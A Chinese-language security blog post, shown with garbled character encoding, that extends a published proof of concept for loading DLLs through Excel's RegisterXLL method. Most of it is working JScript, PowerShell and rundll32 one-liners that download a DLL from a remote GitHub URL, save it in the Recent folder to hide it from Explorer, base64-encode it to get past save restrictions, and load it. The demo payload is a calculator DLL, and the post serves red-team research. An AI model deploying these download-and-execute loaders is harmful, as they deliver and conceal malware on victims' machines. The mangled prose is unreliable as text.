I"®9<h2 id="0x00-å‰è¨€">0x00 å‰è¨€</h2>
<hr />

<p>Ryan Hansonâ€@ryHansonæœ€è¿‘åˆ†äº«äº†ä¸€ä¸ªæŠ€å·§ï¼Œåˆ©ç”¨<code class="language-plaintext highlighter-rouge">Excel.Application object's RegisterXLL()</code>èƒ½å¤ŸåŠ è½½dllã€‚æˆ‘å¯¹å…¶åˆ†äº«çš„POCä½œäº†æµ‹è¯•ï¼Œæ¥ç€åšäº†æ‰©å±•ï¼Œæ·»åŠ åŠŸèƒ½å®ç°è¿œç¨‹ä¸‹è½½æ‰§è¡Œï¼Œå¹¶ä¸”åˆ†æè¯¥æ–¹æ³•ç›¸å…³çš„åˆ©ç”¨æŠ€å·§ï¼Œè¯¦ç»†ä»‹ç»è„šæœ¬å¼€å‘ä¸­çš„ç»†èŠ‚ã€‚</p>

<h2 id="0x01-ç®€ä»‹">0x01 ç®€ä»‹</h2>
<hr />

<p>æœ¬æ–‡å°†è¦ä»‹ç»å¦‚ä¸‹å†…å®¹ï¼š</p>

<ul>
  <li>POCæµ‹è¯•</li>
  <li>æ·»åŠ åŠŸèƒ½å®ç°è¿œç¨‹ä¸‹è½½æ‰§è¡Œ</li>
  <li>æ‰©å±•ç”¨æ³•1ï¼šé€šè¿‡powershellå®ç°</li>
  <li>æ‰©å±•ç”¨æ³•2ï¼šç»“åˆrundll32ä½¿ç”¨</li>
</ul>

<h2 id="0x02-pocæµ‹è¯•">0x02 POCæµ‹è¯•</h2>
<hr />

<p><strong>POCåœ°å€å¦‚ä¸‹ï¼š</strong></p>

<p>https://gist.github.com/ryhanson/227229866af52e2d963cf941af135a52</p>

<p>å‰ææ˜¯ç³»ç»Ÿå·²å®‰è£…Microsoft Officeè½¯ä»¶ï¼Œå…±æä¾›ä¸‰ç§åˆ©ç”¨æ–¹å¼</p>

<h3 id="1rundll32">1.rundll32</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";x=new%20ActiveXObject('Excel.Application');x.RegisterXLL('C:\\test\\messagebox.dll');this.close();
</code></pre></div></div>

<h3 id="2js">2.js</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>var excel = new ActiveXObject("Excel.Application");
excel.RegisterXLL("C:\\test\\messagebox.dll");
</code></pre></div></div>

<h3 id="3powershell">3.powershell</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$excel = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application"))
$excel.RegisterXLL("C:\test\messagebox.dll")
</code></pre></div></div>

<p><strong>æ³¨ï¼š</strong></p>

<p>æµ‹è¯•çš„messagebox.dllæ¥è‡ªäºï¼šhttps://github.com/3gstudent/test/blob/master/msg.dll</p>

<p>å¤§å°3kbï¼Œæºä»£ç åŠç¼–è¯‘æ–¹æ³•å¯å‚ç…§æ–‡ç« <a href="https://3gstudent.github.io/Use-Office-to-maintain-persistence">ã€ŠUse Office to maintain persistenceã€‹</a></p>

<h2 id="0x03-æ·»åŠ åŠŸèƒ½">0x03 æ·»åŠ åŠŸèƒ½</h2>
<hr />

<h3 id="jscriptåŸºç¡€çŸ¥è¯†">JscriptåŸºç¡€çŸ¥è¯†ï¼š</h3>

<p><strong>1ã€è¾“å‡ºå†…å®¹</strong></p>

<p>jsä»£ç å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>WScript.Echo("1");
</code></pre></div></div>

<p>ç›´æ¥æ‰§è¡Œjsè„šæœ¬ä¼šå¼¹æ¡†</p>

<p>cmdæ‰§è¡Œï¼š<code class="language-plaintext highlighter-rouge">cscript.exe msg.js</code>ï¼Œæ§åˆ¶å°è¾“å‡º1</p>

<p><strong>2ã€ç‰¹æ®Šç›®å½•</strong></p>

<p>è¾“å‡ºå½“å‰ç”¨æˆ·çš„ä¸´æ—¶ç›®å½•ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>WScript.Echo(WScript.CreateObject("WScript.Shell").Environment("USER")("TEMP"));
</code></pre></div></div>

<p>è¾“å‡ºRecentç›®å½•ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>WScript.Echo(WScript.CreateObject("WScript.Shell").SpecialFolders("Recent");
</code></pre></div></div>

<p>å³<code class="language-plaintext highlighter-rouge">%AppData%\Microsoft\Windows\Recent</code>ï¼ˆè¯¥ç›®å½•åæ–‡ä¼šç”¨åˆ°ï¼‰</p>

<p>å¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-20/2-1.png" alt="Alt text" /></p>

<p>æ·»åŠ æ–‡ä»¶åå¹¶è¾“å‡ºï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>WScript.Echo(WScript.CreateObject("WScript.Shell").SpecialFolders("Recent")+"\\msg.dll");
</code></pre></div></div>

<h3 id="å¯¹åŸpocæ·»åŠ åŠŸèƒ½">å¯¹åŸPOCæ·»åŠ åŠŸèƒ½ï¼š</h3>

<p><strong>1ã€åˆ¤æ–­æ˜¯å¦å®‰è£…Microsoft Office</strong></p>

<p>é€šè¿‡åˆ¤æ–­æ˜¯å¦å­˜åœ¨Microsoft Officeé»˜è®¤å®‰è£…æ–‡ä»¶å¤¹å®ç°</p>

<p>æŸ¥æ‰¾æ–‡ä»¶å¤¹ï¼š</p>

<p><code class="language-plaintext highlighter-rouge">"c:\Program Files\Microsoft Office"</code></p>

<p>å¯¹åº”jsä»£ç å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>var FileSys = WScript.CreateObject("Scripting.FileSystemObject");   
if (FileSys.FolderExists("c:\\Program Files\\Microsoft Office"))   
{   
	WScript.Echo("[+] Find Microsoft Office.");   
}
else
{
	WScript.Echo("[!] I can't find Microsoft Office!");    
}
</code></pre></div></div>

<p><strong>2ã€ä»Githubä¸‹è½½dllæ–‡ä»¶å¹¶ä¿å­˜è‡³Recentç›®å½•</strong></p>

<p><strong>æ–¹å¼1:</strong> ä½¿ç”¨Msxml2.XMLHTTP</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>var sGet=new ActiveXObject("ADODB.Stream");
var xGet=null;
xGet=new ActiveXObject("Msxml2.XMLHTTP");
xGet.Open("GET","https://raw.githubusercontent.com/3gstudent/test/master/calc.dll",0);
xGet.Send();
sGet.Type=1;
sGet.Open();
sGet.Write(xGet.ResponseBody);
sGet.SaveToFile((WScript.CreateObject("WScript.Shell").SpecialFolders("Recent")+"\\calc.dll"),2);
</code></pre></div></div>

<p><strong>æ–¹å¼2:</strong> ä½¿ç”¨WinHttp.WinHttpRequest.5.1</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>h=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
h.Open("GET","https://raw.githubusercontent.com/3gstudent/test/master/calc.dll",false);
h.Send();
s=new ActiveXObject("ADODB.Stream");
s.Type=1;
s.Open();
s.Write(h.ResponseBody);
x=new ActiveXObject("WScript.Shell").SpecialFolders("Recent")+"\\calc.dll";
s.SaveToFile(xï¼Œ2);
</code></pre></div></div>

<p>ä¸¤ç§jsæ–¹å¼å‡å¯ä»¥ï¼Œä½†æ˜¯åœ¨rundll32ä¸‹ä½¿ç”¨çš„è¯ï¼Œéœ€è¦ä½¿ç”¨æ–¹å¼2ï¼ŒåŸå› å¦‚ä¸‹ï¼š</p>

<p>ä¸æ”¯æŒ<code class="language-plaintext highlighter-rouge">WScript.CreateObject("WScript.Shell")</code>ï¼Œéœ€è¦æ¢æˆ<code class="language-plaintext highlighter-rouge">new%20ActiveXObject("WScript.Shell")</code></p>

<p>cmdæ‰§è¡Œï¼š</p>

<p><code class="language-plaintext highlighter-rouge">rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";xGet=new%20ActiveXObject("Msxml2.XMLHTTP");xGet.Open("GET","https://raw.githubusercontent.com/3gstudent/test/master/calc.dll",0);xGet.Send();</code></p>

<p>æç¤ºæƒé™ä¸å¤Ÿï¼Œå¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-20/2-2.png" alt="Alt text" /></p>

<p><strong>æ³¨ï¼š</strong></p>

<p>é€‰æ‹©ä¿å­˜åœ¨Recentç›®å½•æ˜¯ä¸ºäº†æé«˜éšè”½æ€§</p>

<p>ä¿å­˜åœ¨Recentç›®å½•ï¼Œé€šè¿‡explorer.exeæ— æ³•æŸ¥çœ‹ä¸‹è½½çš„dllï¼Œè¯¦æƒ…å¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/ExcelDllLoader/master/1.gif" alt="Alt text" /></p>

<p>ä½†åœ¨cmdä¸‹èƒ½å¤ŸæŸ¥çœ‹ä¸‹è½½çš„dllï¼Œè¯¦æƒ…å¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/ExcelDllLoader/master/3.png" alt="Alt text" /></p>

<p>åœ¨å…¶ä»–ç›®å½•ä¸å­˜åœ¨è¿™ä¸ªé—®é¢˜ï¼Œè¯¦æƒ…å¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/ExcelDllLoader/master/2.gif" alt="Alt text" /></p>

<p>ä¸ºä¿è¯jså’Œrundll32åˆ©ç”¨ä»£ç æ ¼å¼å¯¹åº”ï¼ŒåŸjsä»£ç ä½œç›¸åº”ä¼˜åŒ–ï¼Œæœ€ç»ˆä»£ç ä¸ºï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>FileSys = WScript.CreateObject("Scripting.FileSystemObject");   
if (FileSys.FolderExists("c:\\Program Files\\Microsoft Office"))   
{   
	WScript.Echo("[+] Find Microsoft Office."); 
	WScript.Echo("[+] Download file...");
	h=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
	h.Open("GET","https://raw.githubusercontent.com/3gstudent/test/master/calc.dll",false);
	h.Send();
	s=new ActiveXObject("ADODB.Stream");
	s.Type=1;
	s.Open();
	s.Write(h.ResponseBody);
	x=new ActiveXObject("WScript.Shell").SpecialFolders("Recent")+"\\calc.dll";
	s.SaveToFile(x,2);

	WScript.Echo("[+] Download Success.");
	WScript.Echo("[+] Load dll...");	 
	e= new ActiveXObject("Excel.Application");
	e.RegisterXLL(x);
	WScript.Echo("[+] Load dll Success.");	  
}
else
{
	WScript.Echo("[!] I can't find Microsoft Office!");  	   
}
</code></pre></div></div>

<p><strong>æ³¨ï¼š</strong></p>

<p>ç›¸å…³ä»£ç å·²ä¸Šä¼ è‡³Githubï¼Œå®Œæ•´POCå¯å‚ç…§ï¼š</p>

<p>https://github.com/3gstudent/ExcelDllLoader</p>

<h2 id="0x04-æ‰©å±•ç”¨æ³•">0x04 æ‰©å±•ç”¨æ³•</h2>
<hr />

<h3 id="1é€šè¿‡powershellå®ç°">1ã€é€šè¿‡powershellå®ç°</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$path=$env:APPDATA+"\Microsoft\Windows\Recent\calc.dll"
$client = new-object System.Net.WebClient
$client.DownloadFile('https://raw.githubusercontent.com/3gstudent/test/master/calc.dll', $path)
$excel = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application"))
$excel.RegisterXLL($path)
</code></pre></div></div>

<p><strong>æ³¨ï¼š</strong></p>

<p>è¯¥ä»£ç ç¼ºå°‘åˆ¤æ–­MicrosoftOfficeæ˜¯å¦å®‰è£…çš„åŠŸèƒ½</p>

<h3 id="2ç»“åˆrundll32ä½¿ç”¨">2ã€ç»“åˆrundll32ä½¿ç”¨</h3>

<p>éœ€è¦æ³¨æ„å¦‚ä¸‹ç»†èŠ‚ï¼š</p>

<ul>
  <li>ç©ºæ ¼ç”¨%20è¡¨ç¤º</li>
  <li>ä¸ºé¿å…æ‰§è¡Œåå¼¹æ¡†ï¼Œéœ€è¦åŠ å…¥è¯­å¥document.write();</li>
</ul>

<p>å¦åˆ™ï¼Œå¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-20/2-22.png" alt="Alt text" /></p>

<p>ä½¿ç”¨ADODB.Streamä¿å­˜æ–‡ä»¶ï¼Œä¼šæŠ¥é”™,æµ‹è¯•ä»£ç å¦‚ä¸‹ï¼š</p>

<p><code class="language-plaintext highlighter-rouge">rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","https://raw.githubusercontent.com/3gstudent/test/master/calc.dll",false);h.Send();s=new%20ActiveXObject("ADODB.Stream");s.Type=1;s.Open();s.Write(h.ResponseBody);x=new%20ActiveXObject("WScript.Shell").SpecialFolders("Recent")+"\\calc.dll";s.SaveToFile(x,2);</code></p>

<p>æç¤ºå› ä¸ºå®‰å…¨è®¾ç½®å¯¼è‡´æ— æ³•ä¿å­˜æ–‡ä»¶ï¼Œå¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-20/2-3.png" alt="Alt text" /></p>

<p>æ¢ç”¨Scripting.FileSystemObjectï¼Œèƒ½å¤Ÿä¿å­˜æ–‡æœ¬æ–‡ä»¶ï¼Œä½†æ˜¯ä¸æ”¯æŒäºŒè¿›åˆ¶æ–‡ä»¶</p>

<p>ä¿å­˜æ–‡æœ¬æ–‡ä»¶,æµ‹è¯•ä»£ç å¦‚ä¸‹ï¼š</p>

<p><code class="language-plaintext highlighter-rouge">rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","https://raw.githubusercontent.com/3gstudent/test/master/version.txt",false);h.Send();s=new%20ActiveXObject("Scripting.FileSystemObject");f=s.CreateTextFile("c:\\test\\1.txt",true);f.WriteLine(h.ResponseText);f.Close();</code></p>

<p>ä¿å­˜äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæµ‹è¯•ä»£ç å¦‚ä¸‹ï¼š</p>

<p><code class="language-plaintext highlighter-rouge">rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","https://raw.githubusercontent.com/3gstudent/test/master/calc.dll",false);h.Send();s=new%20ActiveXObject("Scripting.FileSystemObject");f=s.CreateTextFile("c:\\test\\1.txt",true);f.WriteLine(h.ResponseText);f.Close();</code></p>

<p>æŠ¥é”™ï¼Œå¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-20/2-4.png" alt="Alt text" /></p>

<p><strong>è§£å†³æ–¹æ³•ï¼š</strong></p>

<p>å°†äºŒè¿›åˆ¶æ–‡ä»¶ä½œbase64ç¼–ç å¹¶ä¿å­˜æˆæ–‡æœ¬æ–‡ä»¶ï¼Œå†é€šè¿‡Scripting.FileSystemObjectä¿å­˜</p>

<p>å¯¹calc.dllä½œbase64ç¼–ç å¹¶ä¿å­˜è‡³æ–‡ä»¶buffer.txt,å¯¹åº”powershellä»£ç å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$fileContent = [System.IO.File]::ReadAllBytes('calc.dll')
$fileContentEncoded = [System.Convert]::ToBase64String($fileContent)| set-content ("buffer.txt") 
</code></pre></div></div>

<p><strong>æ³¨ï¼š</strong></p>

<p>è¯»å–äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä¸èƒ½ä½¿ç”¨å‘½ä»¤Get-content</p>

<p>å°†buffer.txtä¸Šä¼ è‡³github</p>

<p>ä¸‹è½½base64å¹¶ä¿å­˜æ–‡ä»¶å¯¹åº”çš„jsä»£ç å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>h=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
h.Open("GET","https://raw.githubusercontent.com/3gstudent/test/master/calcbase64.txt",false);
h.Send();
fso1=new ActiveXObject("Scripting.FileSystemObject");
f=fso1.CreateTextFile("c:\\test\\1.txt",true);
f.WriteLine(h.ResponseText);
f.Close();
</code></pre></div></div>

<p>ä¸‹è½½base64å¹¶ä¿å­˜æ–‡ä»¶å¯¹åº”rundll32çš„ä»£ç å¦‚ä¸‹ï¼š</p>

<p><code class="language-plaintext highlighter-rouge">rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","https://raw.githubusercontent.com/3gstudent/test/master/calcbase64.txt",false);h.Send();s=new%20ActiveXObject("Scripting.FileSystemObject");f=s.CreateTextFile("c:\\test\\1.txt",true);f.WriteLine(h.ResponseText);f.Close();</code></p>

<p>æ–‡ä»¶ä¿å­˜æˆåŠŸï¼Œè¯¥æ–‡ä»¶å­˜å‚¨base64åŠ å¯†åçš„calc.dll</p>

<p>base64è§£å¯†è¯¥æ–‡ä»¶å¹¶åŠ è½½dllå¯¹åº”çš„jsä»£ç å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>x="c:\\test\\calc.dll";
h=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
h.Open("GET","https://raw.githubusercontent.com/3gstudent/test/master/calcbase64.txt",false);
h.Send();
var enc = new ActiveXObject("System.Text.ASCIIEncoding");
var length = enc.GetByteCount_2(h.ResponseText);
var ba = enc.GetBytes_4(h.ResponseText);
var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
ba = transform.TransformFinalBlock(ba, 0, length);
s=new ActiveXObject("ADODB.Stream");
s.Type=1;
s.Open();
s.Write(ba);	
s.SaveToFile(x,2);
new ActiveXObject("Excel.Application").RegisterXLL(x);
</code></pre></div></div>

<p><strong>æ³¨ï¼š</strong></p>

<p>ä»¥ä¸Šä¸¤æ®µä»£ç ç»“åˆï¼Œå¯åº”ç”¨åœ¨é€šè¿‡rundll32è¿›è¡Œæ–‡ä»¶ä¸‹è½½ï¼ˆå…ˆé€šè¿‡rundll32ä¸‹è½½base64åŠ å¯†çš„æ–‡ä»¶ï¼Œç„¶åä½¿ç”¨jsè„šæœ¬è§£å¯†ï¼‰ï¼Œå¯è§£å†³åœ¨ä¹‹å‰çš„æ–‡ç« ã€ŠJavaScript backdoorã€‹ç»™è¯»è€…ç•™ä¸‹çš„å°bug</p>

<p>base64è§£å¯†è¯¥æ–‡ä»¶å¹¶åŠ è½½dllå¯¹åº”çš„powershellä»£ç å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$FilePath="C:\test\test1.dll"
$base64Buf = Get-content c:\test\1.txt
$fileContentBytes = [System.Convert]::FromBase64String($base64Buf) 
[System.IO.File]::WriteAllBytes($FilePath,$fileContentBytes)
$excel = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application"))
$excel.RegisterXLL($FilePath)
</code></pre></div></div>

<h2 id="0x05-å°ç»“">0x05 å°ç»“</h2>
<hr />

<p>æœ¬æ–‡ä»‹ç»äº†åˆ©ç”¨Excel.Application objectâ€™s RegisterXLL() methodåŠ è½½dllçš„ç›¸å…³æ–¹æ³•ï¼Œç€é‡åˆ†æå¦‚ä½•ç¼–å†™jså’Œpowershellè„šæœ¬å¯¹å…¶æ‰©å±•ï¼Œå¹¶è§£å†³äº†åœ¨ä¹‹å‰çš„æ–‡ç« ã€ŠJavaScript backdoorã€‹ç»™è¯»è€…ç•™ä¸‹çš„å°bugã€‚</p>

<hr />

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>

:ET